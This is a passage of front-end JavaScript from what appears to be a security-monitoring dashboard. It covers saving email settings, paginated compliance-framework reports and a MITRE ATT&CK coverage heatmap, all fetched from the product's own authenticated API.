    'SMTP_HOST','SMTP_PORT','SMTP_FROM','SMTP_TO','EMAIL_ENABLED'];
  const settings = {};
  for (const f of fields) {
    const el = document.getElementById('s_' + f);
    if (el) settings[f] = el.value;
  }
  const statusEl = document.getElementById('settingsStatus');
  statusEl.innerHTML = '<div class="status-msg" style="color:var(--muted)">Saving...</div>';
  try {
    const r = await fetch(BASE + '/api/settings', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({token: _authToken, admin_password: settingsPassword, settings}),
    });
    const d = await r.json();
    if (d.error) { statusEl.innerHTML = '<div class="status-msg err">' + escapeHtml(d.error) + '</div>'; }
    else { statusEl.innerHTML = '<div class="status-msg ok">' + escapeHtml(d.message) + '</div>'; setTimeout(() => closeSettings(), 1200); }
  } catch(e) { statusEl.innerHTML = '<div class="status-msg err">' + escapeHtml(e.message) + '</div>'; }
};

// --- Compliance Reports (Phase 14 M4) ---
async function loadComplianceFrameworks() {
  try {
    const r = await fetch(BASE + '/api/compliance/frameworks', {headers:{'Authorization':'Bearer '+_authToken}});
    const d = await r.json();
    if (!d.ok || !d.frameworks) {
      document.getElementById('compliance-content').innerHTML = '<div class="empty">Could not load compliance frameworks.</div>';
      return;
    }
    if (d.frameworks.length === 0) {
      document.getElementById('complianceFramework').innerHTML = '<option value="">No frameworks</option>';
      document.getElementById('compliance-content').innerHTML = '<div class="empty">No compliance frameworks available. Framework YAML files may be missing from the installation.</div>';
      return;
    }
    const sel = document.getElementById('complianceFramework');
    sel.innerHTML = '';
    d.frameworks.forEach(fw => {
      const opt = document.createElement('option');
      opt.value = fw.id;
      opt.textContent = fw.name;
      sel.appendChild(opt);
    });
    loadComplianceReport();
  } catch(e) {
    console.log('compliance frameworks error:', e);
    document.getElementById('compliance-content').innerHTML = '<div class="empty">Failed to load compliance data.</div>';
  }
}

let _complianceAllControls = [];
let _complianceControls = [];
let _compliancePage = 0;
const _compliancePageSize = 10;

function _filterCompliancePage() {
  const status = document.getElementById('complianceStatus').value;
  _complianceControls = status ? _complianceAllControls.filter(c => c.status === status) : [..._complianceAllControls];
  _compliancePage = 0;
  // Recalculate summary stats for filtered view
  const total = _complianceControls.length;
  const notMapped = _complianceControls.filter(c => c.status === 'not_mapped').length;
  const covered = total - notMapped;
  const pct = total > 0 ? Math.round((covered / total) * 100) : 0;
  document.getElementById('comp-coverage').textContent = pct + '%';
  document.getElementById('comp-covered').textContent = covered;
  document.getElementById('comp-notmapped').textContent = notMapped;
  document.getElementById('comp-total').textContent = total;
  _renderCompliancePage();
}

function _renderCompliancePage() {
  const el = document.getElementById('compliance-content');
  const total = _complianceControls.length;
  const pages = Math.ceil(total / _compliancePageSize);
  if (_compliancePage >= pages) _compliancePage = Math.max(0, pages - 1);
  const start = _compliancePage * _compliancePageSize;
  const slice = _complianceControls.slice(start, start + _compliancePageSize);
  const statusColors = {active:'#00b894',deployed:'#fdcb6e',not_mapped:'#b2bec3'};
  const statusLabels = {active:'Active',deployed:'Deployed',not_mapped:'Not Mapped'};
  let html = '<table style="width:100%;border-collapse:collapse;font-size:12px">';
  html += '<tr style="border-bottom:1px solid var(--border)"><th style="text-align:left;padding:6px 8px;color:var(--muted);font-size:10px;text-transform:uppercase">Control</th><th style="text-align:left;padding:6px 8px;color:var(--muted);font-size:10px;text-transform:uppercase">Name</th><th style="text-align:left;padding:6px 8px;color:var(--muted);font-size:10px;text-transform:uppercase">Status</th><th style="text-align:left;padding:6px 8px;color:var(--muted);font-size:10px;text-transform:uppercase">Rules</th><th style="text-align:right;padding:6px 8px;color:var(--muted);font-size:10px;text-transform:uppercase">Events</th></tr>';
  slice.forEach(c => {
    const sc = statusColors[c.status]||'#b2bec3';
    const sl = statusLabels[c.status]||c.status;
    const rules = c.mapped_rules && c.mapped_rules.length ? c.mapped_rules.join(', ') : '&mdash;';
    html += '<tr style="border-bottom:1px solid var(--border)">';
    html += '<td style="padding:6px 8px;font-weight:500">' + escapeHtml(c.id) + '</td>';
    html += '<td style="padding:6px 8px" title="' + escapeHtml(c.description||'') + '">' + escapeHtml(c.name) + '</td>';
    html += '<td style="padding:6px 8px"><span style="color:' + sc + ';font-weight:600">' + sl + '</span></td>';
    html += '<td style="padding:6px 8px;font-size:11px;color:var(--muted)">' + rules + '</td>';
    html += '<td style="padding:6px 8px;text-align:right">' + (c.fire_count||0) + '</td>';
    html += '</tr>';
  });
  html += '</table>';
  if (pages > 1) {
    html += '<div style="display:flex;align-items:center;justify-content:flex-end;gap:8px;margin-top:8px;font-size:11px;color:var(--muted)">';
    html += '<button onclick="_compliancePage=Math.max(0,_compliancePage-1);_renderCompliancePage()" style="padding:2px 8px;font-size:11px;background:var(--bg);color:var(--muted);border:1px solid var(--border);border-radius:3px;cursor:pointer"' + (_compliancePage===0?' disabled':'') + '>&laquo; Prev</button>';
    html += '<span>' + (_compliancePage+1) + ' / ' + pages + '</span>';
    html += '<button onclick="_compliancePage=Math.min(' + (pages-1) + ',_compliancePage+1);_renderCompliancePage()" style="padding:2px 8px;font-size:11px;background:var(--bg);color:var(--muted);border:1px solid var(--border);border-radius:3px;cursor:pointer"' + (_compliancePage>=pages-1?' disabled':'') + '>Next &raquo;</button>';
    html += '</div>';
  }
  el.innerHTML = html;
}

async function loadComplianceReport() {
  const fw = document.getElementById('complianceFramework').value;
  if (!fw) return;
  const hrs = document.getElementById('complianceHours').value;
  const el = document.getElementById('compliance-content');
  const sumEl = document.getElementById('compliance-summary');
  // Only show loading spinner on first load; on refresh keep existing content visible
  if (!_complianceAllControls || _complianceAllControls.length === 0) {
    el.innerHTML = '<div class="loading">Loading...</div>';
  }
  try {
    const r = await fetch(BASE + '/api/compliance/report?framework=' + encodeURIComponent(fw) + '&hours=' + hrs, {headers:{'Authorization':'Bearer '+_authToken}});
    const d = await r.json();
    if (!d.ok) { el.innerHTML = '<div style="color:var(--muted);font-size:13px">Error: ' + escapeHtml(d.error||'Unknown') + '</div>'; return; }
    sumEl.style.maxHeight = '200px'; sumEl.style.margin = '12px 0'; sumEl.style.overflow = 'visible';
    const dl = document.getElementById('complianceDownload');
    dl.href = BASE + '/api/compliance/report/html?framework=' + encodeURIComponent(fw) + '&hours=' + hrs;
    dl.style.display = 'inline-block';
    _complianceAllControls = d.controls || [];
    document.getElementById('complianceStatus').value = '';
    _filterCompliancePage();
  } catch(e) {
    el.innerHTML = '<div style="color:var(--muted);font-size:13px">Failed to load compliance data.</div>';
  }
}

// ── MITRE ATT&CK Coverage (Phase 15 M3) ──────────────────────────────

async function loadMitreCoverage() {
  try {
    const r = await fetch(BASE + '/api/mitre/coverage', {headers:{'Authorization':'Bearer '+_authToken}});
    if (!r.ok) { document.getElementById('mitre-heatmap').innerHTML = '<div class="empty">Failed to load MITRE coverage (HTTP ' + r.status + ')</div>'; return; }
    const d = await r.json();
    if (d.ok === false) { document.getElementById('mitre-heatmap').innerHTML = '<div class="empty">MITRE coverage error: ' + escapeHtml(d.error || 'unknown') + '</div>'; return; }
    const sumEl = document.getElementById('mitre-summary');
    sumEl.style.maxHeight = '200px'; sumEl.style.margin = '12px 0'; sumEl.style.overflow = 'visible';
    document.getElementById('mitre-techniques').textContent = d.total_techniques || 0;
    document.getElementById('mitre-tactics').textContent = (d.total_tactics || 0) + '/14';
    // Count total annotated rules
    let ruleCount = 0;
    var techs = d.techniques || {};
    if (Array.isArray(techs)) techs = {};
    for (const tid of Object.keys(techs)) {
      ruleCount += (techs[tid].rules || []).length;
    }
    document.getElementById('mitre-rules').textContent = ruleCount;
    // Build tactic heatmap
    const heatmap = document.getElementById('mitre-heatmap');
    let html = '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:8px">';
    for (const ts of (d.tactic_summary || [])) {
      const count = ts.techniques_covered || 0;
      const bg = count === 0 ? 'var(--bg)' : count <= 2 ? '#2d5a3d' : count <= 5 ? '#27ae60' : '#1e8449';
      const border = count === 0 ? '1px solid var(--border)' : 'none';
      html += '<div style="background:' + bg + ';border:' + border + ';border-radius:6px;padding:10px 12px;cursor:pointer" onclick="toggleMitreTacticDetail(this,\\'' + escapeHtml(ts.tactic) + '\\',' + JSON.stringify(ts.technique_ids||[]).replace(/"/g,'&quot;') + ')" title="' + escapeHtml(ts.label) + '">';
      html += '<div style="font-size:12px;font-weight:600;color:' + (count > 0 ? '#fff' : 'var(--muted)') + '">' + escapeHtml(ts.label) + '</div>';
      html += '<div style="font-size:18px;font-weight:700;color:' + (count > 0 ? '#fff' : 'var(--muted)') + ';margin-top:4px">' + count + '</div>';
      html += '<div style="font-size:10px;color:' + (count > 0 ? 'rgba(255,255,255,0.7)' : 'var(--muted)') + '">techniques</div>';
      html += '</div>';
    }
    html += '</div>';
    heatmap.innerHTML = html;
  } catch(e) {
    console.error('MITRE coverage load error:', e);
    document.getElementById('mitre-heatmap').innerHTML = '<div class="empty">Failed to load MITRE coverage</div>';
  }
}

function toggleMitreTacticDetail(el, tactic, techIds) {
  const existing = el.querySelector('.mitre-detail');
  if (existing) { existing.remove(); return; }
  if (!techIds || techIds.length === 0) return;
  const detail = document.createElement('div');
  detail.className = 'mitre-detail';
  detail.style.cssText = 'margin-top:8px;padding-top:8px;border-top:1px solid rgba(255,255,255,0.2);font-size:11px;color:rgba(255,255,255,0.85)';
  detail.innerHTML = techIds.map(function(t){ return '<div style="padding:2px 0">' + escapeHtml(t) + '</div>'; }).join('');
  el.appendChild(detail);
}

function downloadNavigatorLayer(e) {
  e.preventDefault();
  const a = document.createElement('a');
  a.href = BASE + '/api/mitre/navigator-layer';
  a.download = 'tinysocs-navigator-layer.json';
  // Add auth header via fetch + blob
  fetch(BASE + '/api/mitre/navigator-layer', {headers:{'Authorization':'Bearer '+_authToken}})
    .then(function(r){ return r.blob(); })
    .then(function(blob){
      const url = URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = url;
      link.download = 'tinysocs-navigator-layer.json';
      link.click();
      URL.revokeObjectURL(url);
    });
}

// Boot: check existing session
checkExistingSession();
</script>
</div><!-- /dashboardContent -->
</body>
</html>
"""
